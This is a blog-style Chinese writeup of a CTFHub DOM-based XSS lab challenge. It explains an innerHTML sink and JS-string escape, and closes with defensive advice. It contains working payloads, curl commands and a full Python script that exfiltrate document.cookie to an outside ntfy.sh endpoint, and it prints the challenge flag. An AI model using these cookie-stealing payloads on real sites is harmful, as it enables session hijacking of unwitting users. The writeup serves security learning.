---
layout: post
title: CTFHub - XSS DOM 反射型 Writeup
platform: ctfhub
date: 2026-10-22 20:43:00 +0800
categories: CTF
---

CTFHub - XSS DOM 反射型 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → DOM 型 XSS - 反射）
- 题型：Web
- 考点：**DOM 型 XSS**、`innerHTML` 危险 sink、**JS 字符串逃逸**

```text
页面标题：CTFHub 技能学习 | XSS DOM Reflex

访问 / 会 302 跳到：
    /?text=CTFHub%20is%20very%20niubility

★ 关键代码（页面源码里）：

    <p id="text"></p>
    <script>
        $("#text")[0].innerHTML = 'hello';       ← 你的输入被填进这个字符串
    </script>

★ 参数是怎么进去的（实测）：

    输入 TESTVALUE
    → $("#text")[0].innerHTML = 'TESTVALUE';          （原样拼进 JS 字符串）

    输入 '; alert(1); '
    → $("#text")[0].innerHTML = ''; alert(1); '';      ★ 直接用分号隔开执行了

    输入 <img src=x onerror=alert(1)>
    → $("#text")[0].innerHTML = '<img src=x onerror=alert(1)>';   ★ innerHTML 解析标签

    ★ 两种打法：
      ① 逃出 JS 字符串（用 '; 闭合，// 注释）
      ② 塞 HTML 标签（innerHTML 会解析）

★ 利用（逃出字符串 + 外带 Cookie）：

    payload：
    ';fetch('https://ntfy.sh/<topic>',{method:'POST',mode:'no-cors',
               body:'cookie='+encodeURIComponent(document.cookie)});//

    服务器生成的最终 JS：
    $("#text")[0].innerHTML = '';fetch('https://ntfy.sh/<topic>',{...});//';
                              └┬┘                                      └┬┘
                        原字符串被闭合                            注释掉多余的 ';

    ★ 完美闭合，代码执行

★ 外带结果：

    cookie=flag=ctfhub{b503f57f4db1d9f8821751da}
    ua=...HeadlessChrome/112...（Bot 是无头 Chrome）

flag         : ctfhub{b503f57f4db1d9f8821751da}
```

二、题目分析

**① 什么是 DOM 型 XSS**

```text
传统 XSS（反射/存储）：
    服务器把 payload 拼进 HTML → 浏览器解析 HTML → 执行

DOM 型 XSS：
    服务器返回的 HTML 是"干净的"
    是【前端 JS】从 URL / 输入框读取数据，再用危险 API 写进 DOM
    → 浏览器执行

★ 核心区别：漏洞在【前端代码】里，不在后端输出里
```

**② 这题的具体代码**

```html
<p id="text"></p>

<script>
    $("#text")[0].innerHTML = 'hello';
    //                         └──┬───┘
    //                      你的 ?text= 参数被拼在这里
</script>
```

**两个危险点叠加**：

```
① 你的输入被拼进【JS 字符串】
   → 可以用 ' 闭合字符串，插入任意 JS 代码

② 结果被赋给 innerHTML
   → innerHTML 会把字符串当 HTML 解析 → 标签会生效
```

**③ 两种攻击方式详解**

**方式 A：逃出 JS 字符串（本题用的）**

```js
// 你输入：';alert(1);//
// 拼成：
$("#text")[0].innerHTML = '';alert(1);//';

                          └──┬──┘ └──┬──┘
                      闭合字符串   注释掉后面多余的 ';
```

**方式 B：塞 HTML 标签**

```js
// 你输入：<img src=x onerror=alert(1)>
// 拼成：
$("#text")[0].innerHTML = '<img src=x onerror=alert(1)>';
//                         └───────────┬────────────┘
//                          这个字符串被赋给 innerHTML
//                          → 浏览器把它当 HTML 解析
//                          → img 加载失败 → onerror 执行
```

**★ 重要细节**：

```
innerHTML 插入的 <script> 标签【不会执行】（HTML 规范规定）
但 <img onerror>、<svg onload>、<iframe> 等【会执行】

所以 DOM 型 XSS 常用：
    <img src=x onerror=...>
    <svg onload=...>
    <iframe src=javascript:...>
    <details open ontoggle=...>
```

**④ 为什么这题叫"DOM Reflex"**

```text
输入来自 URL（反射）
但最终是通过【JS 的 innerHTML】进入 DOM 的（DOM 型）

所以叫 "DOM Reflex"（域模型 + 反射）

★ 严格说，这题服务器也把输入嵌进了 HTML，
  所以它也有"反射型"的成分 —— 是混合型
  但关键点是 innerHTML 这个 DOM sink
```

**⑤ 为什么"输出编码"防不住这种攻击**

```text
如果后端只做 HTML 实体编码（&lt; &gt;）：
    ?text=<img src=x onerror=alert(1)>
    → &lt;img src=x onerror=alert(1)&gt;
    → innerHTML = '<img...>' 被当成普通文本显示 → 不执行 ❌ 防住了

但如果用 JS 字符串逃逸：
    ?text=';alert(1);//
    → 没有 < > 需要编码！
    → innerHTML = '';alert(1);//';  → 照样执行 ✅ 没防住

★ 结论：防护要按【上下文】来
    HTML 上下文：编码 &lt; &gt;
    JS 字符串上下文：需要 JS 转义（\x27 之类），或者干脆别拼
```

三、解题步骤

**第 1 步：确认 DOM XSS 点**

```
浏览器访问：
    http://challenge-xxx:10800/?text=<img src=x onerror=alert(1)>

→ 弹窗        ← XSS 确认

或者用字符串逃逸：
    http://challenge-xxx:10800/?text=';alert(1);//
→ 弹窗        ← 也确认了
```

**查看页面源码**（Ctrl+U 或 F12 元素）：

```html
<p id="text"></p>
<script>
    $("#text")[0].innerHTML = '<img src=x onerror=alert(1)>';
</script>
```

**★ 看到你的 payload 出现在 JS 字符串里 → 确认是 DOM 型。**

**第 2 步：准备接收端**

```
新标签页打开：
    https://ntfy.sh/你的随机topic

保持开着（消息会实时显示）
```

**第 3 步：构造外带 payload**

**用字符串逃逸方式**（推荐，因为不受 HTML 实体编码影响）：

```js
';fetch('https://ntfy.sh/你的topic',{
    method:'POST',
    mode:'no-cors',
    body:'cookie='+encodeURIComponent(document.cookie)
});// 
```

**为什么这么写**：

```
';          ← 闭合原来的单引号字符串
fetch(...)  ← 你的代码
;//         ← 注释掉后面多余的 ';
```

**完整 payload（一行）**：

```js
';fetch('https://ntfy.sh/myctf_dom_abc',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)});//
```

**第 4 步：URL 编码并拼成完整地址**

```python
import urllib.parse
payload = "';fetch('https://ntfy.sh/myctf_dom_abc',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)});//"
url = "http://challenge-xxx:10800/?text=" + urllib.parse.quote(payload)
```

**得到类似**：

```
http://challenge-xxx:10800/?text=%27%3Bfetch%28%27https%3A%2F%2Fntfy.sh%2Fmyctf_dom_abc%27%2C%7Bmethod%3A%27POST%27%2Cmode%3A%27no-cors%27%2Cbody%3A%27cookie%3D%27%2BencodeURIComponent%28document.cookie%29%7D%29%3B%2F%2F
```

**第 5 步：提交给 Bot**

```bash
curl -X POST "http://challenge-xxx:10800/submit" \
     -H "Content-Type: application/json" \
     -d '{"url":"http://challenge-xxx:10800/?text=%27%3Bfetch..."}'
```

**返回**：

```json
{"code": 0, "msg": "Successfully"}
```

**第 6 步：读接收端**

```bash
curl "https://ntfy.sh/myctf_dom_abc/json?poll=1"
```

**收到**：

```json
{"event":"message",
 "message":"cookie=flag%3Dctfhub%7Bb503f57f4db1d9f8821751da%7D || ua=..."}
```

**URL 解码**：

```
flag%3Dctfhub%7Bb503f57f4db1d9f8821751da%7D
  ↓
flag=ctfhub{b503f57f4db1d9f8821751da}
```

**🎉 flag 到手**

**第 7 步：提交 → 通关**

---

**完整脚本（实测用的）**

```python
import ssl, json, urllib.request, urllib.parse, time, random, string

base  = "http://challenge-xxx:10800"
TOPIC = "ctfhub_dom_" + "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
NTFY  = "https://ntfy.sh/" + TOPIC

# ① 构造 payload（逃出 JS 字符串）
payload = ("';fetch('%s',{method:'POST',mode:'no-cors',"
           "body:'cookie='+encodeURIComponent(document.cookie)});//") % NTFY

url = base + "/?text=" + urllib.parse.quote(payload)

# ② 提交给 Bot
body = json.dumps({"url": url}).encode()
req = urllib.request.Request(base + "/submit", data=body, method="POST",
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())      # {"code":0,"msg":"Successfully"}

# ③ 轮询
for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

---

**也可以在浏览器里手工验证（不用脚本）**

```
① 把 payload 直接粘到地址栏：
    http://challenge-xxx:10800/?text=';alert(document.cookie);//

   ★ 这时会在你自己的浏览器里弹出你的 cookie
     （当然是空的，因为 flag 在 Bot 那里）

② 确认能弹了，说明 payload 有效

③ 但要让 Bot 中招，还是得：
   · 用 ntfy 收（URL 编码后提交给 /submit）
   —— 因为 Browse 里手动打开只会触发你自己的浏览器
```

四、延伸知识

**① DOM 型 XSS 的常见危险 sink**

| 危险 API | 说明 | 例子 |
|---|---|---|
| `innerHTML` | 把字符串当 HTML 解析 | `el.innerHTML = userInput` |
| `outerHTML` | 同上（替换整个元素）| |
| `document.write()` | 直接写入文档流 | `document.write(input)` |
| `eval()` | 执行字符串代码 | `eval(userInput)` |
| `setTimeout(str, n)` | 传字符串时会 eval | `setTimeout(input, 100)` |
| `Function(str)` | 构造函数执行代码 | |
| `location.href` | 可以是 `javascript:` | `location = input` |
| `element.setAttribute('href', x)` | `javascript:alert(1)` | |
| `jQuery.html()` / `$()` | 等价 innerHTML | `$('#x').html(input)` |

**★ 记住：只要"用户输入 → 危险 API"，就可能 DOM XSS。**

**② 安全的替代**

```javascript
// ❌ 危险
el.innerHTML = userInput;

// ✅ 安全（当文本处理）
el.textContent = userInput;
el.innerText = userInput;
```

**③ DOM 型 XSS 为什么难扫描**

```text
· 服务器返回的 HTML 是"干净的"（payload 不在响应里）
· 传统 WAF / 扫描器看不到 payload
· 必须【执行 JS】才能发现
★ 所以检测 DOM XSS 需要动态分析（headless 浏览器 + 污点追踪）
   工具如：DOM Invader（Burp）、Semgrep、Chrome DevTools 的 Sources 面板
```

**④ 三种 XSS 对比总结**

| | 反射型 | 存储型 | DOM 型 |
|---|---|---|---|
| **payload 位置** | URL | 服务端存储 | URL（前端读取）|
| **谁拼接的** | 服务器 | 服务器 | **前端 JS** |
| **响应里有 payload 吗** | 有 | 有 | **可能没有！** |
| **防护重点** | 输出编码 | 输出编码 | **避免危险 API** |
| **本题** | | | ✅ |

**⑤ 防护**

```text
· ★ 不要用 innerHTML 处理不可信数据
    用 textContent / innerText

· 如果必须插 HTML → 用白名单净化库（DOMPurify）

· 避免 eval / Function / setTimeout(字符串)

· CSP（内容安全策略）作为兜底
    script-src 'self'   → 内联脚本不执行
    connect-src 'self'  → 外带请求发不出去

· Cookie 加 HttpOnly

· 前端框架默认安全：
    React 的 JSX 自动转义（除非 dangerouslySetInnerHTML）
    Vue 的 {{ }} 自动转义（除非 v-html）
```

五、总结

- **本题核心：`innerHTML = '用户输入'` → 既可以用 `'` 逃出 JS 字符串，也可以塞 HTML 标签。**
- 两种 payload：

```js
// 方式 A：逃出 JS 字符串（本题实测用这个）
';fetch('https://ntfy.sh/topic',{method:'POST',mode:'no-cors',body:document.cookie});// 

// 方式 B：塞 HTML 标签
<img src=x onerror="fetch('https://ntfy.sh/topic?c='+document.cookie)">
```

- **三个必记要点**：

```text
① DOM 型 XSS 的漏洞在前端 JS，不在后端输出
② innerHTML 是头号危险 API（innerHTML 里的 <script> 不执行，
   但 <img onerror> 会执行）
③ 只做 HTML 实体编码防不住 JS 字符串逃逸 —— 要按上下文编码
```

- **实测 flag**：

```text
ctfhub{b503f57f4db1d9f8821751da}
```


**手工复现要点**：

```text
· 第一步先在浏览器里验证：?text=';alert(1);//  能弹窗就对了
· 然后换成 fetch 到 ntfy，URL 编码后提交给 /submit
· 读 ntfy 拿 flag
· 关键理解：'; 闭合字符串 + // 注释掉多余的引号
```
